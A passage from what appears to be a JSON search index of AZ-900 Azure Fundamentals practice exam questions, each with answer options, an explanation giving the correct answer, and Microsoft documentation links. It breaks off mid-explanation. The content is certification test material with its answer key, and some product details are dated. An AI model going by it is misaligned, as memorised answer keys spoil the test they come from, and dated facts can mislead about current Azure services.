Powershell:\u00a0https://docs.microsoft.com/en-us/powershell/azure/?view=azps-4.5.0</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-48-what-database-service-is-specifically-designed-to-be-extremely-fast-in-responding-to-requests-for-small-amounts-of-data-called-low-latency","title":"Question 48:\u00a0What database service is specifically designed to be extremely fast in responding to requests for small amounts of data (called low latency)?","text":"<ul> <li>SQL Database</li> <li>SQL Data Warehouse</li> <li>Cosmos DB</li> <li>SQL Server in a VM</li> </ul> <p>Explanation: Cosmos DB - extremely low latency (fast) storage designed for smaller pieces of data quickly; SaaS. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cosmos-db/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-49-if-you-are-a-us-federal-state-local-or-tribal-government-entities-and-their-solution-providers-which-azure-option-should-you-be-looking-to-register-for","title":"Question 49: If you are a US federal, state, local, or tribal government entities and their solution providers, which Azure option should you be looking to register for?","text":"<ul> <li>Azure is not available for government officials</li> <li>Azure Government</li> <li>Azure Department of Defence</li> <li>Azure Public Portal</li> </ul> <p>Explanation: Hopefully, it's clear that US Federal, State, Local and Tribal governments can use the US Government portal. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-government/documentation-government-welcome</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-50-what-is-the-service-level-agreement-for-two-or-more-azure-virtual-machines-that-have-been-manually-placed-into-different-availability-zones-in-the-same-region","title":"Question 50:\u00a0What is the service level agreement for two or more Azure Virtual Machines that have been manually placed into different Availability Zones in the same region?","text":"<ul> <li>99.95%</li> <li>99.90%</li> <li>99.99%</li> <li>100%</li> </ul> <p>Explanation: 99.99%. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/sla/virtual-machines/v1_9/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#test-3","title":"Test 3","text":"","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-1-what-is-the-significance-of-the-azure-region-why-is-it-important","title":"Question 1:\u00a0What is the significance of the Azure region? Why is it important?","text":"<ul> <li>You must select a region when creating most resources, and the region is the area of the world where those resources will be physically located.</li> <li>Once you select a region, you cannot create resources outside of that region. So selecting the right region is an important decision.</li> <li>Region is just a folder structure in which you organize resources, much like file folders on a computer.</li> <li>Even though you have to choose a region when creating resources, there's generally no consequence of what you select. You can create a network in one region and then create virtual machines for that network in another region.    </li> </ul> <p>Explanation: The region is the area of the world where resources get created. You can create resources in any region that you have access to. But there are sometimes restrictions when creating a resource in one region that related resources like networks must also be in the same region for logical reasons. For more info:\u00a0https://azure.microsoft.com/en-us/global-infrastructure/geographies/#overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-2-true-or-false-through-azure-active-directory-one-can-control-access-to-an-application-but-not-the-resources-of-the-application","title":"Question 2:\u00a0TRUE OR FALSE: Through Azure Active Directory one can control access to an application but not the resources of the application.","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation: Azure AD can control the access of both the apps and the app resources. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis#which-features-work-in-azure-ad</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-3-what-is-the-name-of-the-open-source-project-run-by-the-apache-foundation-that-maps-to-the-hdinsight-tools-within-azure","title":"Question 3:\u00a0What is the name of the open source project run by the Apache foundation that maps to the HDInsight tools within Azure?","text":"<ul> <li>Apache Jazz</li> <li>Apache Cayenne</li> <li>Apache Jaguar</li> <li>Apache Hadoop</li> <li>Explanation: Hadoop is open source home of the HDInsight tools. For more info:\u00a0https://docs.microsoft.com/en-us/azure/hdinsight/hadoop/apache-hadoop-introduction</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-4-which-tool-within-the-azure-portal-will-make-specific-recommendations-based-on-your-actual-usage-for-how-you-can-improve-your-use-of-azure","title":"Question 4:\u00a0Which tool within the Azure Portal will make specific recommendations based on your actual usage for how you can improve your use of Azure?","text":"<ul> <li>Azure Monitor    </li> <li>Azure Service Health</li> <li>Azure Dashboard</li> <li>Azure Advisor</li> </ul> <p>Explanation: Azure Advisor - a tool that will analyze your use of Azure and make you specific recommendations based on your usage across availability, security, performance and cost categories. For more info:\u00a0https://docs.microsoft.com/en-us/azure/advisor/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-5-what-does-it-mean-that-security-is-a-shared-model-in-azure","title":"Question 5: What does it mean that security is a \"shared model\" in Azure?","text":"<ul> <li>Both users and Azure have responsibilities for security.</li> <li>You must keep your security keys private and ensure it doesn't get out.</li> <li>Azure takes care of security completely.</li> <li>Azure takes no responsibility for security.</li> </ul> <p>Explanation: The shared security model means that, depending on the application model, you and Azure both have roles in ensuring a secure environment. For more info:\u00a0https://docs.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-6-what-is-the-name-of-the-collective-set-of-apis-that-provide-machine-learning-and-artificial-intelligence-services-to-your-own-applications-like-voice-recognition-image-tagging-and-chat-bot","title":"Question 6:\u00a0What is the name of the collective set of APIs that provide machine learning and artificial intelligence services to your own applications like voice recognition, image tagging, and chat bot?","text":"<ul> <li>Cognitive Services</li> <li>Natural Language Service, LUIS</li> <li>Azure Machine Learning Studio</li> <li>Azure Batch</li> </ul> <p>Explanation: Azure Cognitive Services is the set of Machine Learning and AI API's. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cognitive-services/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-7-what-happens-if-azure-does-not-meet-its-own-service-level-agreement-guarantee-sla","title":"Question 7:\u00a0What happens if Azure does not meet its own Service Level Agreement guarantee (SLA)?","text":"<ul> <li>The service will be free that month</li> <li>You will be financially refunded a small amount of your monthly fee</li> <li>It's not possible. Azure will always meet it's SLA?</li> </ul> <p>Explanation: Microsoft offers a refund of 10% or 25% depending on how badly they miss their service guarantee. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/sla/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-8-what-software-is-used-to-synchronize-your-on-premises-ad-with-your-azure-ad","title":"Question 8:\u00a0What software is used to synchronize your on premises AD with your Azure AD?","text":"<ul> <li>Azure AD Federation Services</li> <li>Azure AD Domain Services</li> <li>LDAP</li> <li>AD Connect  </li> </ul> <p>Explanation: AD Connect is used to synchronize your corporate AD with Azure AD. For more info:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-9-true-or-false-if-your-feature-is-in-the-general-availability-phase-then-your-feature-will-receive-support-from-all-microsoft-support-channels","title":"Question 9:\u00a0True or false: If your feature is in the General Availability phase, then your feature will receive support from all Microsoft support channels.","text":"<ul> <li>TRUE</li> <li>FALSE</li> </ul> <p>Explanation: This is true. Do not use preview features in production apps. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/preview-supplemental-terms/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-10-true-or-false-if-you-wanted-to-deploy-a-virtual-machine-to-china-you-would-just-choose-the-china-region-from-the-drop-down","title":"Question 10:\u00a0TRUE OR FALSE: If you wanted to deploy a virtual machine to China, you would just choose the China region from the drop down.","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation: Some regions of the world require special contracts with the local provider such as Germany and China. For more info:\u00a0https://docs.microsoft.com/en-us/azure/china/overview-checklist</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-11-what-is-a-policy-initiative-in-azure","title":"Question 11: What is a policy initiative in Azure?","text":"<ul> <li>A custom designed policy</li> <li>Requiring all resources in Azure to use tags</li> <li>The ability to group policies together</li> <li>Assigning permissions to a role in Azure</li> </ul> <p>Explanation: The ability to group policies together. For more info:\u00a0https://docs.microsoft.com/en-us/azure/governance/policy/overview#initiative-definition</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-12-which-database-product-offers-sub-5-millisecond-response-times-as-a-feature","title":"Question 12: Which database product offers \"sub 5 millisecond\" response times as a feature?","text":"<ul> <li>Cosmos DB</li> <li>SQL Data Warehouse</li> <li>SQL Server in a VM</li> <li>Azure SQL Database</li> </ul> <p>Explanation: Cosmos DB is low latency, and even offers sub 5-ms response times at some levels. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cosmos-db/introduction</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-13-which-of-the-following-resources-are-not-considered-compute-resources","title":"Question 13:\u00a0Which of the following resources are not considered Compute resources?","text":"<ul> <li>Function Apps</li> <li>Azure Batch</li> <li>Virtual Machines</li> <li>Virtual Machine Scale Sets</li> <li>Load Balancer</li> </ul> <p>Explanation: A load balancer is a networking product, and does not execute your code.  For more info:\u00a0https://docs.microsoft.com/en-us/azure/load-balancer/load-balancer-overview. For more information on compute resources:\u00a0https://azure.microsoft.com/en-us/product-categories/compute/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-14-with-azure-public-cloud-anyone-with-a-valid-credit-card-can-sign-up-and-get-services-immediately","title":"Question 14:\u00a0With Azure public cloud, anyone with a valid credit card can sign up and get services immediately","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation: Yes, Azure public cloud is open to the public in all countries that Azure supports. For more info:\u00a0https://docs.microsoft.com/en-us/learn/modules/create-an-azure-account/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-15-which-azure-service-can-be-enabled-to-enable-multi-factor-authentication-for-administrators-but-not-require-it-for-regular-users","title":"Question 15:\u00a0Which Azure service can be enabled to enable Multi-Factor Authentication for administrators but not require it for regular users?","text":"<ul> <li>Azure AD B2B    </li> <li>Advanced Threat Protection</li> <li>Azure Firewall</li> <li>Privileged Identity Management</li> </ul> <p>Explanation: Privileged Identity Management can be used to ensure privileged users have to jump through additional verification because of their role. For more info:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/privileged-identity-management/pim-configure</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-16-what-is-an-azure-subscription","title":"Question 16: What is an Azure Subscription?","text":"<ul> <li>Each user account is associated with a unique subscription. If you need more than one subscription, you need to create multiple user accounts.</li> <li>It is the level at which services are billed. All resources created under a subscription are billed to that subscription.</li> </ul> <p>Explanation: Subscription is the level at which things get billed. Multiple users can be associated with a subscription at various permission levels. For more info:\u00a0https://docs.microsoft.com/en-us/services-hub/health/azure_sponsored_subscription</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-17-what-operating-systems-does-an-azure-virtual-machine-support","title":"Question 17:\u00a0What operating systems does an Azure Virtual Machine support?","text":"<ul> <li>Windows, Linux and macOS</li> <li>macOS</li> <li>Windows</li> <li>Linux</li> <li>Windows and Linux</li> </ul> <p>Explanation: Azure Virtual Machines support Windows and Linux. For more info:\u00a0https://docs.microsoft.com/en-us/azure/virtual-machines/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-18-which-azure-management-tool-analyzes-your-usage-of-azure-and-makes-suggestions-specifically-targeted-to-help-you-optimize-your-usage-of-azure-regarding-cost-security-and-performance","title":"Question 18:\u00a0Which Azure management tool analyzes your usage of Azure and makes suggestions specifically targeted to help you optimize your usage of Azure regarding cost, security and performance?","text":"<ul> <li>Azure Service Health</li> <li>Azure Advisor</li> <li>Azure Firewall</li> <li>Azure Mobile App</li> </ul> <p>Explanation: Azure Advisor analyzes your specific usage of Azure and makes helpful suggestions on how it can be improved.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-19-which-feature-within-azure-alerts-you-to-service-issues-that-happen-in-azure-itself-not-specifically-related-to-your-own-resources","title":"Question 19:\u00a0Which feature within Azure alerts you to service issues that happen in Azure itself, not specifically related to your own resources?","text":"<ul> <li>Azure Monitor</li> <li>Azure Portal Dashboard</li> <li>Azure Service Health</li> <li>Azure Security Center</li> </ul> <p>Explanation: Azure Service Health - lets you know about any Azure-related service issues including region-wide downtime. For more info:\u00a0https://docs.microsoft.com/en-us/azure/service-health/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-20-which-two-features-does-virtual-machine-scale-sets-provide-as-part-of-the-core-product-pick-two","title":"Question 20:\u00a0Which two features does Virtual Machine Scale Sets provide as part of the core product? Pick two.","text":"<ul> <li>Content Delivery Network</li> <li>Firewall</li> <li>Automatic installation of supporting apps and deployment of custom code</li> <li>Load balancing between virtual machines    </li> <li>Autoscaling of virtual machines</li> </ul> <p>Explanation: VMSS provides autoscale features and has a built in load balancer. You still need to have a way to deploy your code to the new servers, as you do with regular VMs. For more info:\u00a0https://docs.microsoft.com/en-us/azure/virtual-machine-scale-sets/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-21-where-can-you-go-to-see-what-standards-microsoft-is-in-compliance-with","title":"Question 21:\u00a0Where can you go to see what standards Microsoft is in compliance with?","text":"<ul> <li>Azure Service Health</li> <li>Azure Security Center</li> <li>Trust Center</li> <li>Azure Privacy Page</li> </ul> <p>Explanation: The list of standards that Azure has been certified to meet is in the Trust Center.  For more info:\u00a0https://www.microsoft.com/en-us/trust-center</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-22-what-does-it-mean-if-a-service-is-in-private-preview-mode","title":"Question 22: What does it mean if a service is in Private Preview mode?","text":"<ul> <li>The service is generally available for use, and Microsoft will provide support for it</li> <li>Anyone can use the service but it must not be for production use</li> <li>You have to apply to get selected in order to use that service</li> <li>Anyone can use the service for any reason</li> </ul> <p>Explanation: Private Preview means you have to apply to use a service, and you may or may not be selected. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/preview-supplemental-terms</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-23-what-are-groups-of-subscriptions-called","title":"Question 23: What are groups of subscriptions called?","text":"<ul> <li>Azure Policy</li> <li>Subscription Groups</li> <li>ARM Groups</li> <li>Management Groups</li> </ul> <p>Explanation: Subscriptions can be nested and placed into management groups to make managing them easier. For more info:\u00a0https://docs.microsoft.com/en-us/azure/governance/management-groups/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-24-how-do-you-stop-your-azure-account-from-incurring-costs-above-a-certain-level-without-your-knowledge","title":"Question 24: How do you stop your Azure account from incurring costs above a certain level without your knowledge?","text":"<ul> <li>Switch to Azure Reserved Instances with Hybrid Benefit for VMs</li> <li>Only use Azure Functions which have a significant free limit</li> <li>Implement the Azure spending limit in the Account Center    </li> <li>Set up a billing alert to send you an email when it reaches a certain level</li> </ul> <p>Explanation: If you don't want to spend over a certain amount, implement a spending limit in the account center. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cost-management-billing/manage/spending-limit</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-25-how-does-multi-factor-authentication-make-a-system-more-secure","title":"Question 25:\u00a0How does Multi-Factor Authentication make a system more secure?","text":"<ul> <li>It allows the user to log in without a password because they have already previously been validated using a browser cookie</li> <li>It requires the user to have access to their verified phone in order to log in </li> <li>It doesn't make it more secure</li> <li>It is another password that a user has to memorize, making it more secure</li> </ul> <p>Explanation: Multi-Factor Authentication (MFA) - the concept of having something additional to a \u201cpassword\u201d that is required to log in; passwords are find-able or guessable; but having your mobile phone on you to receive a phone call, text or run an app to get a code is harder for an unknown hacker to get. For more info:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-26-how-many-hours-are-available-free-when-using-the-azure-b1s-general-purpose-virtual-machines-under-a-azure-free-account-in-the-first-12-months","title":"Question 26:\u00a0How many hours are available free when using the Azure B1S General Purpose Virtual Machines under a Azure free account in the first 12 months?","text":"<ul> <li>500 hrs</li> <li>750 hrs</li> <li>300 hrs</li> <li>Indefinite amount of hrs</li> </ul> <p>Explanation: Each Azure free account includes 750 hours free for Azure B1S General Purpose Virtual Machines for the first 12 months. For more info:\u00a0https://azure.microsoft.com/en-us/free/free-account-faq/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-27-what-is-the-goal-of-a-ddos-attack","title":"Question 27:\u00a0What is the goal of a DDoS attack?","text":"<ul> <li>To extract data from a database</li> <li>To trick users into giving up personal information</li> <li>To overwhelm and exhaust application resources</li> <li>To crack the password from administrator accounts</li> </ul> <p>Explanation: DDoS is a type of attack that tries to exhaust application resources. The goal is to affect the application\u2019s availability and its ability to handle legitimate requests. For more info:\u00a0https://docs.microsoft.com/en-us/azure/virtual-network/ddos-protection-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-28-true-or-false-azure-powershell-scripts-and-command-line-interface-cli-scripts-are-entirely-compatible-with-each-other","title":"Question 28: True or false: Azure PowerShell scripts and Command Line Interface (CLI) scripts are entirely compatible with each other?","text":"<ul> <li>TRUE</li> <li>FALSE</li> </ul> <p>Explanation: No, PowerShell is it's own language, different than CLI. For more info:\u00a0https://docs.microsoft.com/en-us/powershell/azure/?view=azps-4.5.0</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-29-for-tax-optimization-which-type-of-expense-is-preferable","title":"Question 29:\u00a0For tax optimization, which type of expense is preferable?","text":"<ul> <li>CapEx</li> <li>OpEx</li> </ul> <p>Explanation: Operating Expenditure is thought to be preferable because you can fully deduct expenses when they are incurred. For more info:\u00a0https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/strategy/business-outcomes/fiscal-outcomes</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-30-what-is-the-recommended-way-within-azure-to-store-secrets-such-as-private-cryptographic-keys","title":"Question 30:\u00a0What is the recommended way within Azure to store secrets such as private cryptographic keys?","text":"<ul> <li>Azure Advanced Threat Protection (ATP)</li> <li>In an Azure Storage account private blob container</li> <li>Within the application code</li> <li>Azure Key Vault</li> </ul> <p>Explanation: Azure Key Vault - the modern way to store cryptographic keys, signed certificates and secrets in Azure. For more info:\u00a0https://docs.microsoft.com/en-us/azure/key-vault/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-31-which-of-the-following-would-be-an-example-of-an-internet-of-things-iot-device","title":"Question 31:\u00a0Which of the following would be an example of an Internet of Things (IoT) device?","text":"<ul> <li>A video game, installed on Windows clients around the world, that keep user scores in the cloud.</li> <li>A mobile application that is used to watch online video courses</li> <li>A refrigerator that monitors how much milk you have left and sends you a text message when you are running low</li> <li>A web application that people use to perform their banking tasks</li> </ul> <p>Explanation: An IoT device is not a standard computing device but connects to a network to report data on a regular basis. A web server, a personal computer, or a mobile app is not an IoT device. For more info:\u00a0https://docs.microsoft.com/en-us/azure/iot-fundamentals/iot-introduction</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-32-deploying-azure-app-services-applications-consists-of-what-two-components-pick-two","title":"Question 32:\u00a0Deploying Azure App Services applications consists of what two components? Pick two.","text":"<ul> <li>Database scripts</li> <li>Configuration</li> <li>Managing operating system updates</li> <li>Packaged code</li> </ul> <p>Explanation: Azure App Services, platform as a service, consists of code and configuration. For more info:\u00a0https://docs.microsoft.com/en-us/azure/app-service/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-33-what-type-of-documents-does-the-microsoft-service-trust-portal-provide","title":"Question 33:\u00a0What type of documents does the Microsoft Service Trust Portal provide?","text":"<ul> <li>Documentation on the individual Azure services and solutions</li> <li>Specific recommendations about your usage of Azure and ways you can improve</li> <li>A list of standards that Microsoft follows, pen test results, security assessments, white papers, faqs, and other documents that can be used to show Microsoft's compliance efforts</li> <li>A tool that helps you manage your compliance to various standards</li> </ul> <p>Explanation: A list of standards that Microsoft follows, pen test results, security assessments, white papers, faqs, and other documents that can be used to show Microsoft's compliance efforts. For more info:\u00a0https://servicetrust.microsoft.com/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-34-which-of-the-following-are-one-of-the-advantages-of-running-your-cloud-in-a-private-cloud","title":"Question 34: Which of the following are one of the advantages of running your cloud in a private cloud?","text":"<ul> <li>Assurance that your code, data and applications are running on isolated hardware, and on an isolated network.</li> <li>You own the hardware, so you can change private cloud hosting providers easily.   </li> <li>Private cloud is significantly cheaper than the public cloud.    </li> </ul> <p>Explanation: Private cloud generally means that you are running your code on isolated computing, not mixed in with other companies. For more info:\u00a0https://azure.microsoft.com/en-us/overview/what-are-private-public-hybrid-clouds/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-35-what-advantage-does-an-application-gateway-have-over-a-load-balancer","title":"Question 35:\u00a0What advantage does an Application Gateway have over a Load Balancer?","text":"<ul> <li>Application Gateway is more like an enterprise-grade product. You should not use a load balancer in production.</li> <li>Application gateway understands the HTTP protocol and can interpret the URL and make decisions based on the URL.</li> <li>Application Gateway can be scaled so that two, three or more instances of the gateway can support your application.</li> </ul> <p>Explanation: Application gateway can make load balancing decisions based on the URL path, while a load balancer can't. For more info:\u00a0https://docs.microsoft.com/en-us/azure/application-gateway/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-36-if-you-wanted-to-get-an-alert-every-time-a-new-virtual-machine-is-created-where-could-you-create-that","title":"Question 36:\u00a0If you wanted to get an alert every time a new virtual machine is created, where could you create that?","text":"<ul> <li>Azure Monitor</li> <li>Azure Policy</li> <li>Subscription settings</li> <li>Azure Dashboard</li> </ul> <p>Explanation: The best place to track events at the resource level is Azure Monitor. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-monitor/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-37-how-many-minutes-per-month-downtime-is-9999-availability","title":"Question 37:\u00a0How many minutes per month downtime is 99.99% availability?","text":"<ul> <li>4</li> <li>1</li> <li>40</li> <li>100</li> </ul> <p>Explanation: 99.99% is 4 minutes per month of downtime. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/sla/summary/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-38-what-is-the-service-level-agreement-for-two-or-more-azure-virtual-machines-that-have-been-placed-into-the-same-availability-set-in-the-same-region","title":"Question 38:\u00a0What is the service level agreement for two or more Azure Virtual Machines that have been placed into the same Availability Set in the same region?","text":"<ul> <li>100%</li> <li>99.90%</li> <li>99.99%</li> <li>99.95%</li> </ul> <p>Explanation: 99.95%. For more info:\u00a0https://azure.microsoft.com/en-us/support/legal/sla/virtual-machines/v1_9/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-39-what-is-the-core-problem-that-you-need-to-solve-in-order-to-have-a-high-availability-application","title":"Question 39:\u00a0What is the core problem that you need to solve in order to have a high-availability application?","text":"<ul> <li>You need to avoid single points of failure</li> <li>You need to ensure your server has a lot of RAM and a lot of CPUs</li> <li>You should have a backup copy of your application on standby, ready to be started up when the main application fails.    </li> <li>You need to ensure the capacity of your server exceeds your highest number of expected concurrent users</li> </ul> <p>Explanation: You'll want to avoid single points of failure, so that any component that fails does not cause the entire application to fail. For more info:\u00a0https://docs.microsoft.com/en-us/azure/architecture/guide/design-principles/redundancy</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-40-what-are-resource-groups","title":"Question 40:\u00a0What are resource groups?","text":"<ul> <li>A folder structure in Azure in which you organize resources like databases, virtual machines, virtual networks, or almost any resource</li> <li>Automatically assigned groups of resources that all have the same type (virtual machine, app service, etc)</li> <li>Based on the tag assigned to a resource by the deployment script, it is assigned to a group</li> <li>Within Azure security model, users are organized into groups, and those groups are granted permissions to resources</li> </ul> <p>Explanation: Resource Groups - a folder structure in Azure in which you organize resources like databases, virtual machines, virtual networks, or almost any resource. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/manage-resource-groups-portal</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-41-which-of-the-following-services-would-not-be-considered-infrastructure-as-a-service","title":"Question 41:\u00a0Which of the following services would NOT be considered Infrastructure as a Service?","text":"<ul> <li>Virtual Network Interface Card (NIC)</li> <li>Azure Functions App</li> <li>Virtual Machine</li> <li>Virtual Network</li> </ul> <p>Explanation: Functions are small pieces of code that you give to Azure to run for you, and you have no access to the underlying infrastructure. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-functions/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-42-what-two-advantages-does-cloud-computing-elasticity-give-to-you-pick-two","title":"Question 42:\u00a0What two advantages does cloud computing elasticity give to you? Pick two.","text":"<ul> <li>You can do more regular backups and you won't lose as much when that backup gets restored</li> <li>You can save money.</li> <li>Servers have become a commodity and Microsoft doesn't even need to even fix servers that fail within Azure.</li> <li>You can serve users better during peak traffic periods by automatically adding more capacity.</li> </ul> <p>Explanation: Elasticity saves you money during slow periods (over night, over the weekend, over the summer, etc) and also allows you to handle the highest peak of traffic. For more info:\u00a0https://azure.microsoft.com/en-us/overview/what-is-elastic-computing/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-43-which-of-the-following-elements-is-considered-part-of-the-network-layer-of-network-security","title":"Question 43:\u00a0Which of the following elements is considered part of the \"network\" layer of network security?","text":"<ul> <li>Keeping operating systems up to date with patches</li> <li>All of the above</li> <li>Locks on the data center doors</li> <li>Separate servers into distinct subnets by role</li> </ul> <p>Explanation: Subnets is part of network security. For more info:\u00a0https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices and https://en.wikipedia.org/wiki/OSI_model</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-44-what-data-format-are-arm-templates-created-in","title":"Question 44:\u00a0What data format are ARM templates created in?","text":"<ul> <li>JSON</li> <li>YAML</li> <li>HTML    </li> <li>XML</li> </ul> <p>Explanation: ARM templates are created in JSON. For more info:\u00a0https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-45-what-does-the-letter-r-in-rbac-stand-for","title":"Question 45:\u00a0What does the letter R in RBAC stand for?","text":"<ul> <li>Rights</li> <li>Review</li> <li>Role</li> <li>Rule</li> </ul> <p>Explanation: RBAC is role based access control. For more info:\u00a0https://docs.microsoft.com/en-us/azure/role-based-access-control/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-46-which-azure-service-when-enabled-will-automatically-block-traffic-to-or-from-known-malicious-ip-addresses-and-domains","title":"Question 46:\u00a0Which Azure service, when enabled, will automatically block traffic to or from known malicious IP addresses and domains?","text":"<ul> <li>Network Security Groups</li> <li>Azure Active Directory</li> <li>Azure Firewall </li> <li>Load Balancer</li> </ul> <p>Explanation: Azure Firewall has a threat-intelligence option that will automatically block traffic to/from bad actors on the Internet. For more info:\u00a0https://docs.microsoft.com/en-us/azure/firewall/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-47-true-or-false-azure-tenant-is-a-dedicated-and-trusted-instance-of-azure-active-directory-thats-automatically-created-when-your-organization-signs-up-for-a-microsoft-cloud-service-subscription","title":"Question 47:\u00a0TRUE OR FALSE: Azure Tenant is a dedicated and trusted instance of Azure Active Directory that's automatically created when your organization signs up for a Microsoft cloud service subscription.","text":"<ul> <li>TRUE</li> <li>FALSE</li> </ul> <p>Explanation: Yes, Azure Tenant is a dedicated and trusted instance of Azure AD that's automatically created when your organization signs up for a Microsoft cloud service subscription. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis#which-features-work-in-azure-ad</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-48-why-should-you-divide-your-application-into-multiple-subnets-as-opposed-to-having-all-your-web-application-and-database-servers-running-on-the-same-subnet","title":"Question 48:\u00a0Why should you divide your application into multiple subnets as opposed to having all your web, application and database servers running on the same subnet?","text":"<ul> <li>Each server type of your application requires its own subnet. It's not possible to mix web servers, database servers and application servers on the same subnet.</li> <li>Separating your application into multiple subnets allows you to have different NSG security rules for each subnet, which can make it harder for a hacker to get from one compromised server onto another.    </li> <li>There are only a limited number of IP addresses available per subnet, so you need multiple subnets over a certain number.</li> </ul> <p>Explanation: For security purposes, you should not allow \"port 80\" web traffic to reach certain servers, and you do that by having separate NSG rules 